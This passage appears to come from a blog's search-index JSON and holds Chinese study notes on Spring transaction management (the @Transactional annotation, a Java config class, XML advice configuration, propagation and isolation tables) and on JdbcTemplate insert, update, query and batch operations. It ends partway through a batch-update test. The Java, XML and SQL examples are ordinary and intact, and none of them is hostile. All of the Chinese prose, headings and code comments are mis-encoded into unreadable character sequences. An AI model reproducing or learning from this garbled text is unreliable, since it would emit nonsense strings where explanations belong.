å¦‚æœæŠŠè¿™ä¸ªæ³¨è§£æ·»åŠ ç±»ä¸Šé¢ï¼Œè¿™ä¸ªç±»é‡Œé¢æ‰€æœ‰çš„æ–¹æ³•éƒ½æ·»åŠ äº‹åŠ¡\n- å¦‚æœæŠŠè¿™ä¸ªæ³¨è§£æ·»åŠ æ–¹æ³•ä¸Šé¢ï¼Œä¸ºè¿™ä¸ªæ–¹æ³•æ·»åŠ äº‹åŠ¡\n\n```java\n@Service\n@Transactional  //æ·»åŠ äº‹åŠ¡æ³¨è§£\npublic class UserService {\n    //æ³¨å…¥ dao\n    @Autowired\n    private UserDao userDao;\n\n    //è½¬è´¦çš„æ–¹æ³•\n    //@Transactional\n    public void accountMoney() {\n        userDao.reduceMoney();\n        int x=10/0; //å¼‚å¸¸\n        userDao.addMoney();\n    }\n}\n\n```\n\n```java\n@Test\npublic void testTransaction() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  userService.accountMoney();\n}\n```\n\n```sql\n#æœ‰å¼‚å¸¸\nid\tname\tmoney\n1\t å°æ˜\t 1000\n2\t å°çº¢\t 1000\n#æ— å¼‚å¸¸\nid\tname\tmoney\n1\t å°æ˜\t 900\n2\t å°çº¢\t 1100\n```\n\næ·»åŠ äº‹åŠ¡æ³¨è§£åå°±ä¸ä¼šå‡ºç°å°æ˜è½¬äº†é’±ä½†æ˜¯å°çº¢æ²¡æœ‰æ”¶åˆ°çš„æƒ…å†µ\n\n## å®Œå…¨æ³¨è§£å£°æ˜å¼\n\n```java\n//åˆ›å»ºé…ç½®ç±»ï¼Œä½¿ç”¨é…ç½®ç±»æ›¿ä»£xmlé…ç½®æ–‡ä»¶\n@Configuration //é…ç½®ç±»\n@ComponentScan(basePackages = \"com.jwt\") //ç»„ä»¶æ‰«æ\n@EnableTransactionManagement //å¼€å¯äº‹åŠ¡\npublic class TxConfig {\n    //åˆ›å»ºæ•°æ®åº“è¿æ¥æ± \n    @Bean\n    public DruidDataSource getDruidDataSource() {\n        DruidDataSource dataSource = new DruidDataSource();\n        dataSource.setDriverClassName(\"com.mysql.jdbc.Driver\");\n        dataSource.setUrl(\"jdbc:mysql://localhost:3306/jwt\");\n        dataSource.setUsername(\"root\");\n        dataSource.setPassword(\"root\");\n        return dataSource;\n    }\n\n    //åˆ›å»º JdbcTemplate å¯¹è±¡\n    @Bean\n    public JdbcTemplate getJdbcTemplate(DataSource dataSource) {//ä»IOCå®¹å™¨ä¸­æ‹¿åˆ°é…ç½®æ³¨å…¥çš„æ•°æ®æº\n        //åˆ° ioc å®¹å™¨ä¸­æ ¹æ®ç±»å‹æ‰¾åˆ° dataSource\n        JdbcTemplate jdbcTemplate = new JdbcTemplate();\n        //æ³¨å…¥ dataSource\n        jdbcTemplate.setDataSource(dataSource);\n        return jdbcTemplate;\n    }\n\n\n    //åˆ›å»ºäº‹åŠ¡ç®¡ç†å™¨\n    @Bean\n    public DataSourceTransactionManager getDataSourceTransactionManager(DataSource dataSource) {\n        DataSourceTransactionManager transactionManager = new DataSourceTransactionManager();\n        transactionManager.setDataSource(dataSource);\n        return transactionManager;\n    }\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testTransaction2() {\n  AnnotationConfigApplicationContext context =\n    new AnnotationConfigApplicationContext(TxConfig.class);\n  UserService userService = context.getBean(\"userService\", UserService.class);\n  userService.accountMoney();\n}\n```\n\n```sql\n#æœ‰å¼‚å¸¸\nid\tname\tmoney\n1\t å°æ˜\t 1000\n2\t å°çº¢\t 1000\n#æ— å¼‚å¸¸\nid\tname\tmoney\n1\t å°æ˜\t 900\n2\t å°çº¢\t 1100\n```\n\n## XMLå£°æ˜å¼\n\n```xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:aop=\"http://www.springframework.org/schema/aop\"\n       xmlns:tx=\"http://www.springframework.org/schema/tx\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n       http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd\n       http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\">\n\n    <!--å¼•å…¥å¤–éƒ¨å±æ€§æ–‡ä»¶-->\n    <context:property-placeholder location=\"classpath:druid.properties\"/>\n    <!--é…ç½®è¿æ¥æ± -->\n    <bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n        <property name=\"driverClassName\" value=\"${jdbc.driverClass}\"></property>\n        <property name=\"url\" value=\"${jdbc.url}\"></property>\n        <property name=\"username\" value=\"${jdbc.username}\"></property>\n        <property name=\"password\" value=\"${jdbc.password}\"></property>\n    </bean>\n    <!--åˆ›å»º JdbcTemplate å¯¹è±¡-->\n    <bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\">\n        <!--æ³¨å…¥dataSource-->\n        <property name=\"dataSource\" ref=\"dataSource\"/>\n    </bean>\n    <!-- ç»„ä»¶æ‰«æ -->\n    <context:component-scan base-package=\"com.jwt\"></context:component-scan>\n\n\n    <!--1ã€åˆ›å»ºäº‹åŠ¡ç®¡ç†å™¨-->\n    <bean id=\"transactionManager\" class=\"org.springframework.jdbc.datasource.DataSourceTransactionManager\">\n        <!--æ³¨å…¥æ•°æ®æº-->\n        <property name=\"dataSource\" ref=\"dataSource\"></property>\n    </bean>\n\n    <!--2ã€é…ç½®é€šçŸ¥-->\n    <tx:advice id=\"txadvice\">\n        <!--é…ç½®äº‹åŠ¡å‚æ•°-->\n        <tx:attributes>\n            <!--æŒ‡å®šå“ªç§è§„åˆ™çš„æ–¹æ³•ä¸Šé¢æ·»åŠ äº‹åŠ¡-->\n            <tx:method name=\"accountMoney\" propagation=\"REQUIRED\"/>\n            <!--æŒ‡å®šåŒ¹é…è§„åˆ™ä¸Šçš„æ–¹æ³•æ·»åŠ äº‹åŠ¡-->\n            <!--<tx:method name=\"account*\"/>-->\n        </tx:attributes>\n    </tx:advice>\n\n    <!--3ã€é…ç½®åˆ‡å…¥ç‚¹å’Œåˆ‡é¢-->\n    <aop:config>\n        <!--é…ç½®åˆ‡å…¥ç‚¹-->\n        <aop:pointcut id=\"pt\" expression=\"execution(* com.jwt.transaction_.UserService.*(..))\"/>\n        <!--é…ç½®åˆ‡é¢-->\n        <aop:advisor advice-ref=\"txadvice\" pointcut-ref=\"pt\"/>\n    </aop:config>\n</beans>\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testTransaction3() {\n    ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"bean7.xml\");\n    UserService userService = context.getBean(\"userService\", UserService.class);\n    userService.accountMoney();\n}\n```\n\n```sql\n#æœ‰å¼‚å¸¸\nid\tname\tmoney\n1\t å°æ˜\t 1000\n2\t å°çº¢\t 1000\n#æ— å¼‚å¸¸\nid\tname\tmoney\n1\t å°æ˜\t 900\n2\t å°çº¢\t 1100\n```\n\n## å£°æ˜å¼äº‹åŠ¡å‚æ•°\n\n![](https://img.jwt1399.top/img/image-20220417211523013.png)\n\n### propagationï¼šäº‹åŠ¡ä¼ æ’­è¡Œä¸º\n\nå¤šäº‹åŠ¡æ–¹æ³•ç›´æ¥è¿›è¡Œäº’ç›¸è°ƒç”¨ï¼ŒSpring æ¡†æ¶äº‹åŠ¡ä¼ æ’­è¡Œä¸ºæœ‰7ç§\n\n| ä¼ æ’­å±æ€§      | æè¿°                                                         |\n| ------------- | ------------------------------------------------------------ |\n| REQUIRED      | å¦‚æœæœ‰äº‹åŠ¡åœ¨è¿è¡Œ,å½“å‰çš„æ–¹æ³•å°±åœ¨è¿™ä¸ªäº‹åŠ¡å†…è¿è¡Œ,å¦åˆ™å°±å¯åŠ¨ä¸€ä¸ªæ–°äº‹åŠ¡,å¹¶åœ¨è‡ªå·±çš„äº‹åŠ¡å†…è¿è¡Œ |\n| REQUIRES_NEW  | å½“å‰çš„æ–¹æ³•å¿…é¡»å¯åŠ¨æ–°äº‹åŠ¡,å¹¶åœ¨å®ƒè‡ªå·±çš„äº‹åŠ¡å†…è¿è¡Œ,å¦‚æœæœ‰äº‹åŠ¡æ­£åœ¨è¿è¡Œ,åº”è¯¥å°†å®ƒæŒ‚èµ· |\n| SUPPORTS      | å¦‚æœæœ‰äº‹åŠ¡åœ¨è¿è¡Œ,å½“å‰çš„æ–¹æ³•å°±åœ¨è¿™ä¸ªäº‹åŠ¡å†…è¿è¡Œ,å¦åˆ™å®ƒå¯ä»¥ä¸è¿è¡Œåœ¨äº‹åŠ¡ä¸­ |\n| NOT_SUPPORTED | å½“å‰çš„æ–¹æ³•ä¸åº”è¯¥è¿è¡Œåœ¨äº‹åŠ¡ä¸­,å¦‚æœæœ‰è¿è¡Œçš„äº‹åŠ¡,å°†å®ƒæŒ‚èµ·       |\n| MANDATORY     | å½“å‰çš„æ–¹æ³•å¿…é¡»è¿è¡Œåœ¨äº‹åŠ¡å†…éƒ¨,å¦‚æœæ²¡æœ‰æ­£åœ¨è¿è¡Œçš„äº‹åŠ¡,å°±æŠ›å‡ºå¼‚å¸¸ |\n| NEVER         | å½“å‰çš„æ–¹æ³•ä¸åº”è¯¥è¿è¡Œåœ¨äº‹åŠ¡ä¸­,å¦‚æœæœ‰è¿è¡Œçš„äº‹åŠ¡,å°±æŠ›å‡ºå¼‚å¸¸     |\n| NESTED        | å¦‚æœæœ‰äº‹åŠ¡è¿è¡Œ,å½“å‰çš„æ–¹æ³•å°±åº”è¯¥åœ¨è¿™ä¸ªäº‹åŠ¡çš„åµŒå¥—äº‹åŠ¡å†…è¿è¡Œ,å¦åˆ™,å°±å¯åŠ¨ä¸€ä¸ªæ–°çš„äº‹åŠ¡,å¹¶åœ¨å®ƒè‡ªå·±çš„äº‹åŠ¡å†…è¿è¡Œ |\n\n![](/Users/jianjian/jwt1399.github.io/source/images/Spring-äº‹åŠ¡/image-20220417212238809.png)\n\t\n\nå¦‚ä¸Šï¼Œä¼ æ’­çº§åˆ«ä¸º REQUIREDã€‚\n\nå³ï¼šå¦‚æœ add æ–¹æ³•æœ¬èº«æœ‰äº‹åŠ¡ï¼Œè°ƒç”¨ update æ–¹æ³•ä¹‹åï¼Œupdate ä½¿ç”¨å½“å‰ add æ–¹æ³•é‡Œé¢çš„äº‹åŠ¡ã€‚å¦‚æœ add æ–¹æ³•æœ¬èº«æ²¡æœ‰äº‹åŠ¡ï¼Œè°ƒç”¨ update æ–¹æ³•ä¹‹åï¼Œupdate åˆ›å»ºæ–°äº‹åŠ¡\n\nå¦‚ä¸Šï¼Œä¼ æ’­çº§åˆ«ä¸ºREQUIRES_NEWã€‚å³ï¼šadd æ–¹æ³•æœ¬èº«æ— è®ºæ˜¯å¦æœ‰äº‹åŠ¡ï¼Œupdateéƒ½åˆ›å»ºæ–°çš„äº‹åŠ¡\n\n```java\n//é…ç½®\n@Transactional(propagation = Propagation.REQUIRED)\n```\n\n### ioslationï¼šäº‹åŠ¡éš”ç¦»çº§åˆ« \n\näº‹åŠ¡æœ‰ç‰¹æ€§æˆä¸ºéš”ç¦»æ€§ï¼Œå¤šäº‹åŠ¡æ“ä½œä¹‹é—´ä¸ä¼šäº§ç”Ÿå½±å“ã€‚ä¸è€ƒè™‘éš”ç¦»æ€§äº§ç”Ÿå¾ˆå¤šé—®é¢˜\n\nä¸‰ä¸ªè¯»é—®é¢˜ï¼šè„è¯»ã€ä¸å¯é‡å¤è¯»ã€è™š(å¹»)è¯» \n\n- è„è¯»ï¼šä¸€ä¸ªæœªæäº¤äº‹åŠ¡è¯»å–åˆ°å¦ä¸€ä¸ªæœªæäº¤äº‹åŠ¡çš„æ•°æ®\n- ä¸å¯é‡å¤è¯»ï¼šä¸€ä¸ªæœªæäº¤äº‹åŠ¡è¯»å–åˆ°å¦ä¸€æäº¤äº‹åŠ¡ä¿®æ”¹æ•°æ®  \n- è™šè¯»ï¼šä¸€ä¸ªæœªæäº¤äº‹åŠ¡è¯»å–åˆ°å¦ä¸€æäº¤äº‹åŠ¡æ·»åŠ æ•°æ® \n\nè§£å†³ï¼šé€šè¿‡è®¾ç½®äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œè§£å†³è¯»é—®é¢˜ã€‚MYSQLé»˜è®¤éš”ç¦»çº§åˆ«:å¯é‡å¤è¯»\n\n|                            | è„è¯»     | ä¸å¯é‡å¤è¯» | è™šè¯»     |\n| -------------------------- | -------- | ---------- | -------- |\n| READ_UNCOMMITTED(è¯»æœªæäº¤) | ä¸å¯è§£å†³ | ä¸å¯è§£å†³   | ä¸å¯è§£å†³ |\n| READ_COMMITTED(è¯»å·²æäº¤)   | å¯è§£å†³   | ä¸å¯è§£å†³   | ä¸å¯è§£å†³ |\n| REPEATABLE_READ(å¯é‡å¤è¯»)  | å¯è§£å†³   | å¯è§£å†³     | ä¸å¯è§£å†³ |\n| SERIALIZABLE(ä¸²è¡ŒåŒ–)       | å¯è§£å†³   | å¯è§£å†³     | å¯è§£å†³   |\n\n```java\n//é…ç½®\n@Transactional(isolation = Isolation.READ_COMMITTED)\n```\n\n### timeoutï¼šè¶…æ—¶æ—¶é—´\n\n- äº‹åŠ¡éœ€è¦åœ¨ä¸€å®šæ—¶é—´å†…è¿›è¡Œæäº¤ï¼Œå¦‚æœä¸æäº¤è¿›è¡Œå›æ»š\n\n- é»˜è®¤å€¼æ˜¯ -1 ï¼Œè®¾ç½®æ—¶é—´ä»¥ç§’å•ä½è¿›è¡Œè®¡ç®—\n\n```java\n//è®¾ç½®\n@Transactional(timeout = 60)\n```\n\n### readOnlyï¼šæ˜¯å¦åªè¯»\n\n- è¯»ï¼šæŸ¥è¯¢æ“ä½œï¼Œå†™ï¼šæ·»åŠ ä¿®æ”¹åˆ é™¤æ“ä½œ\n\n- readOnly é»˜è®¤å€¼ falseï¼Œè¡¨ç¤ºå¯ä»¥æŸ¥è¯¢ï¼Œå¯ä»¥æ·»åŠ ä¿®æ”¹åˆ é™¤æ“ä½œ\n\n- è®¾ç½® readOnly å€¼æ˜¯ trueï¼Œè®¾ç½®æˆ true ä¹‹åï¼Œåªèƒ½æŸ¥è¯¢\n\n```java\n//è®¾ç½®\n@Transactional(readOnly = false)\n```\n\n### rollbackForï¼šå›æ»š\n\nè®¾ç½®å‡ºç°å“ªäº›å¼‚å¸¸è¿›è¡Œäº‹åŠ¡å›æ»š\n\n```java\n//è®¾ç½®\n@Transactional(rollbackFor = NullPointerException.class)\n```\n\n### noRollBackForï¼šä¸å›æ»š\n\nè®¾ç½®å‡ºç°å“ªäº›å¼‚å¸¸ä¸è¿›è¡Œäº‹åŠ¡å›æ»š\n\n```java\n//è®¾ç½®\n@Transactional(noRollbackFor = NullPointerException.class)\n```\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring"],"categories":["Spring"]},{"title":"Spring-JDBCTemplate","url":"/posts/4365.html","content":"\n## å‰è¨€\n\nä»Šå¤©å¼€å§‹å­¦ä¹ æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpring-JDBCTemplateã€‹ï¼Œå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡1å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š04-15\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š04-15\n- [x] ğŸ€æ€»ç»“ï¼šæŒ‰æ—¶å®Œæˆï¼Œä½†æ˜¯å®Œå…¨è®°ä¸ä½ï¼Œè‡ªå·±å†™è¿˜å¾—çœ‹æ–‡æ¡£ï¼\n\n## JdbcTemplate\n\nSpring æ¡†æ¶å¯¹ JDBC è¿›è¡Œå°è£…ï¼Œä½¿ç”¨ JdbcTemplate æ–¹ä¾¿å®ç°å¯¹æ•°æ®åº“æ“ä½œ \n\n## å‡†å¤‡å·¥ä½œ\n\n**1ã€å¼•å…¥ç›¸å…³jaråŒ…**\n\n```\ndruid-1.2.9.jar\nmysql-connector-java-8.0.28.jar\nspring-jdbc-5.3.18.jar\nspring-orm-5.3.18.jar\nspring-tx-5.3.18.jar\n```\n\n**2ã€åœ¨springé…ç½®æ–‡ä»¶é…ç½®æ•°æ®åº“è¿æ¥æ± **\n\n```xml\n<!--å¼•å…¥å¤–éƒ¨å±æ€§æ–‡ä»¶ï¼Œéœ€è¦é…ç½®contextåç§°ç©ºé—´--> \n<context:property-placeholder location=\"classpath:druid.properties\"/>\n<!--é…ç½®è¿æ¥æ± --> \n<bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\">\n    <property name=\"driverClassName\" value=\"${jdbc.driverClass}\"></property>\n    <property name=\"url\" value=\"${jdbc.url}\"></property>\n    <property name=\"username\" value=\"${jdbc.username}\"></property>\n    <property name=\"password\" value=\"${jdbc.password}\"></property>\n</bean>\n```\n\ndruid.properties\n\n```properties\njdbc.driverClass=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/jwt\njdbc.username=root\njdbc.password=root\n```\n\n**3ã€é…ç½®JdbcTemplateå¯¹è±¡ï¼Œæ³¨å…¥DataSource**\n\n```xml\n<!-- JdbcTemplateå¯¹è±¡ -->\n<bean id=\"jdbcTemplate\" class=\"org.springframework.jdbc.core.JdbcTemplate\">\n   <!--æ³¨å…¥dataSource--> \n   <property name=\"dataSource\" ref=\"dataSource\"/>\n</bean>\n```\n\n**4ã€åˆ›å»ºserviceç±»ï¼Œåˆ›å»ºdaoç±»**\n\n- åœ¨daoä¸­æ³¨å…¥jdbcTemplateå¯¹è±¡\n- åœ¨serviceä¸­æ³¨å…¥daoå¯¹è±¡\n\n```xml\n<!-- ç»„ä»¶æ‰«æ -->\n<context:component-scan base-package=\"com.jwt\"></context:component-scan>\n```\n\n```java\n@Service\npublic class BookService {\n    //æ³¨å…¥dao\n    @Autowired\n    private BookDao bookDao;\n}\n```\n\n```java\npublic interface BookDao {\n}\n```\n\n```java\n@Repository\npublic class BookDaoImpl implements BookDao {\n    //æ³¨å…¥JdbcTemplate\n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n}\n```\n\n## å®ç°æ·»åŠ æ“ä½œ\n\n1ã€å…ˆåˆ›å»ºä¸€ä¸ªè¡¨\n\n```sql\nCREATE TABLE `book`(\n  id INT,\n  name VARCHAR (255),\n  status VARCHAR (255)\n)CHARACTER SET utf8 COLLATE utf8_bin ENGINE INNODB ;\n```\n\n2ã€åˆ›å»ºè¡¨å¯¹åº”å®ä½“ç±»\n\n```java\npublic class Book {\n    private String bookId;\n    private String bookName;\n    private String bookStatus;\n\n    public String getBookId() {\n        return bookId;\n    }\n\n    public void setBookId(String bookId) {\n        this.bookId = bookId;\n    }\n\n    public String getBookName() {\n        return bookName;\n    }\n\n    public void setBookName(String bookName) {\n        this.bookName = bookName;\n    }\n\n    public String getBookStatus() {\n        return bookStatus;\n    }\n\n    public void setBookStatus(String bookStatus) {\n        this.bookStatus = bookStatus;\n    }\n}\n```\n\n3ã€ç¼–å†™**service**å’Œ**dao** \n\n- 1.åœ¨daoä¸­å¢åŠ æ•°æ®åº“æ·»åŠ æ–¹æ³•\n- 2.åœ¨daoçš„å®ç°ç±»ä¸­å®ç°è¯¥æ–¹æ³•\n  - è°ƒç”¨JdbcTemplateå¯¹è±¡é‡Œé¢update(String sql, Object... args)æ–¹æ³•å®ç°æ·»åŠ æ“ä½œ \n  - ç¬¬ä¸€ä¸ªå‚æ•°ï¼šsqlè¯­å¥ \n  -  ç¬¬äºŒä¸ªå‚æ•°ï¼šå¯å˜å‚æ•°ï¼Œè®¾ç½®sqlè¯­å¥å€¼  \n- 3.åœ¨serviceä¸­è°ƒç”¨daoçš„æ·»åŠ æ–¹æ³•\n\n```java\npublic interface BookDao {\n     void add(Book book);//æ·»åŠ çš„æ–¹æ³•\n}\n```\n\n```java\n@Repository\npublic class BookDaoImpl implements BookDao {\n    //æ³¨å…¥JdbcTemplate\n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n\n    @Override\n    public void add(Book book) {\n        // åˆ›å»ºsqlè¯­å¥\n        String sql = \"INSERT INTO `book` VALUES (?, ?, ?)\";\n        // è°ƒç”¨æ–¹æ³•å®ç°\n        int update = jdbcTemplate.update(sql, book.getBookId(), book.getBookName(), book.getBookStatus());\n        System.out.println(update);\n    }\n}\n```\n\n```java\n@Service\npublic class BookService {\n    //æ³¨å…¥dao\n    @Autowired\n    private BookDao bookDao;\n    \n    public void add(Book book) {\n        bookDao.add(book);\n    }\n}\n```\n\n4ã€æµ‹è¯•\n\n```java\npublic class testJDBC {\n    @Test\n    public void testadd() {\n        ApplicationContext context =\n                new ClassPathXmlApplicationContext(\"jdbc.xml\");\n        BookService bookService = context.getBean(\"bookService\", BookService.class);\n        Book book = new Book();\n        book.setBookId(\"1\");\n        book.setBookName(\"java\");\n        book.setBookStatus(\"a\");\n        bookService.add(book);\n    }\n}\n```\n\nè¿è¡Œåè¡¨ä¸­å°±ä¼šæˆåŠŸå¢åŠ ä¸€æ¡æ•°æ®\n\n## å®ç°ä¿®æ”¹æ“ä½œ\n\nè¯¦ç»†è¯·å‚è€ƒæ·»åŠ æ“ä½œ\n\n```java\n@Override\npublic void update(Book book) {\n  String sql = \"update book set name=?,status=? where id=?\";\n  Object[] args = {book.getBookName(), book.getBookStatus(),book.getBookId()};\n  int update = jdbcTemplate.update(sql, args);\n  System.out.println(update);\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testupdate() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  Book book = new Book();\n  book.setBookName(\"C++\");\n  book.setBookStatus(\"b\");\n  book.setBookId(\"1\");\n  bookService.update(book);\n}\n```\n\n## å®ç°æ·»åŠ æ“ä½œ\n\n```java\n@Override\npublic void delete(String id) {\n  String sql = \"delete from book where id=?\";\n  int update = jdbcTemplate.update(sql,id);\n  System.out.println(update);\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testdelete() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  bookService.delete(\"1\");\n}\n```\n\n## å®ç°æŸ¥è¯¢æ“ä½œ\n\n### æŸ¥è¯¢è¿”å›æŸä¸ªå€¼\n\n- æŸ¥è¯¢è¡¨é‡Œé¢æœ‰å¤šå°‘æ¡è®°å½•ï¼Œè¿”å›æ˜¯æŸä¸ªå€¼\n\n- queryForObject(String sql, Class\\<T> requiredType)\n\n  - ç¬¬ä¸€ä¸ªå‚æ•°ï¼šsqlè¯­å¥ \n\n  - ç¬¬äºŒä¸ªå‚æ•°ï¼šè¿”å›ç±»å‹Class  \n\n```java\n@Override\npublic int select() {\n  String sql = \"select count(*) from book\";\n  Integer count = jdbcTemplate.queryForObject(sql, Integer.class);\n  return count;\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testselect() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  int select = bookService.select();\n  System.out.println(\"select = \" + select);\n}\n```\n\n### æŸ¥è¯¢è¿”å›å¯¹è±¡\n\n- queryForObject(String sql, RowMapper\\<T> rowMapper, 0bject... args)\n  - ç¬¬ä¸€ä¸ªå‚æ•°ï¼šsqlè¯­å¥\n  - ç¬¬äºŒä¸ªå‚æ•°ï¼šRowMapper æ˜¯æ¥å£ï¼Œé’ˆå¯¹è¿”å›ä¸åŒç±»å‹æ•°æ®ï¼Œä½¿ç”¨è¿™ä¸ªæ¥å£é‡Œé¢ å®ç°ç±»å®Œæˆæ•°æ®å°è£…\n  - ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šsql è¯­å¥å€¼\n\n```java\n//æŸ¥è¯¢è¿”å›å¯¹è±¡\n@Override\npublic Book selectObj(String id) {\n  String sql = \"select * from book where `id`=?\";\n  Book book = jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper<Book>(Book.class), id);\n  return book;\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testselectObj() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  Book book = bookService.selectObj(\"1\");\n  System.out.println(\"book = \" + book);\n}\n```\n\næ•°æ®åº“ä¸­è¡¨çš„å­—æ®µåè¦å’Œå®ä½“ç±»Bookä¸­çš„å­—æ®µåå­—ä¸€æ ·ï¼Œä¸ç„¶ä¼šè¿”å›null\n\n### æŸ¥è¯¢è¿”å›é›†åˆ\n\n- query(String sql, RowMapper\\<T> rowMapper, 0bject... args)\n\n  - ç¬¬ä¸€ä¸ªå‚æ•°: sqlè¯­å¥\n  - ç¬¬äºŒä¸ªå‚æ•°: RowMapper æ˜¯æ¥å£ï¼Œé’ˆå¯¹è¿”å›ä¸åŒç±»å‹æ•°æ®ï¼Œä½¿ç”¨è¿™ä¸ªæ¥å£é‡Œé¢å®ç°ç±»å®Œæˆæ•°æ®å°è£…\n\n  - ç¬¬ä¸‰ä¸ªå‚æ•°: sql è¯­å¥å€¼\n\n```java\n@Override\npublic List<Book> selectCollection() {\n  String sql = \"select * from book\";\n  //è°ƒç”¨æ–¹æ³•\n  List<Book> bookList = jdbcTemplate.query(sql,new BeanPropertyRowMapper<Book>(Book.class));\n  return bookList;\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testselectCollection() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  List<Book> books = bookService.selectCollection();\n  System.out.println(\"books = \" + books);\n}\n```\n\n## å®ç°æ‰¹é‡æ“ä½œ\n\n### æ‰¹é‡æ·»åŠ \n\n- batchUpdateæ–¹æ³•\n  -  ç¬¬ä¸€ä¸ªå‚æ•°ï¼šsqlè¯­å¥\t\n  - ç¬¬äºŒä¸ªå‚æ•°ï¼šListé›†åˆï¼Œæ·»åŠ å¤šæ¡è®°å½•æ•°æ®\n\n```java\n@Override\npublic void batchAdd(List<Object[]> batchArgs) {\n  String sql = \"insert into book values(?,?,?)\";\n  int[] ints = jdbcTemplate.batchUpdate(sql, batchArgs);\n  System.out.println(Arrays.toString(ints));\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testbatchAdd() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  List<Object[]> batchArgs = new ArrayList<>();\n  Object[] o1 = {\"3\",\"java\",\"a\"};\n  Object[] o2 = {\"4\",\"c++\",\"b\"};\n  Object[] o3 = {\"5\",\"MySQL\",\"c\"};\n  batchArgs.add(o1);\n  batchArgs.add(o2);\n  batchArgs.add(o3);\n  //è°ƒç”¨æ‰¹é‡æ·»åŠ \n  bookService.batchAdd(batchArgs);\n}\n```\n\n### æ‰¹é‡ä¿®æ”¹\n\n```java\n@Override\npublic void batchUpdate(List<Object[]> batchArgs) {\n  String sql = \"update book set name=?,status=? where id=?\";\n  int[] ints = jdbcTemplate.batchUpdate(sql, batchArgs);\n  System.out.println(Arrays.toString(ints));\n}\n```\n\næµ‹è¯•\n\n```java\n@Test\npublic void testbatchUpdate() {\n  ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(\"jdbc.xml\");\n  BookService bookService = context.getBean(\"bookService\", BookService.class);\n  List<Object[]> batchArgs = new ArrayList<>();\n  Object[] o1 = {\"java2\",\"a3\",\"3\"};\n  Object[] o2 = {\"c++2\",\"b4\",\"4\"};\n  Object[] o3 = 